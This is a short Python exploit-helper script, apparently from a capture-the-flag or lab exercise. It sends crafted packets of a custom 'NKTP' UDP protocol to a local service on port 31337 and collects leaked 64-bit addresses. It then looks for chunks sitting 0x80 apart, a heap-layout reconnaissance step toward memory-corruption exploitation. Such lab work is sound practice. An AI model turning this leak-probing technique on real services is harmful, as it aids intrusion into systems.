#!/usr/bin/env python3

import os
import socket
import struct

from pwn import u64


HOST = "127.0.0.1"
PORT = int(os.environ.get("NK_HOST_PORT", "31337"))


def request(op, payload=b"", seq=1):
    packet = struct.pack(">4sBBHHH", b"NKTP", 1, op, seq, len(payload), 0)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(2)
        sock.sendto(packet + payload, (HOST, PORT))
        response, _ = sock.recvfrom(1024)
    length = struct.unpack(">H", response[8:10])[0]
    return response[12:12 + length]


addresses = []
for seq in range(1, 65):
    addresses.append(u64(request(5, b"\x00" * 0x80, seq)))

for index, address in enumerate(addresses):
    print(f"{index:02d} 0x{address:x}")

print("pairs")
address_set = set(addresses)
for address in addresses:
    if address + 0x80 in address_set:
        print(f"0x{address:x} -> 0x{address + 0x80:x}")
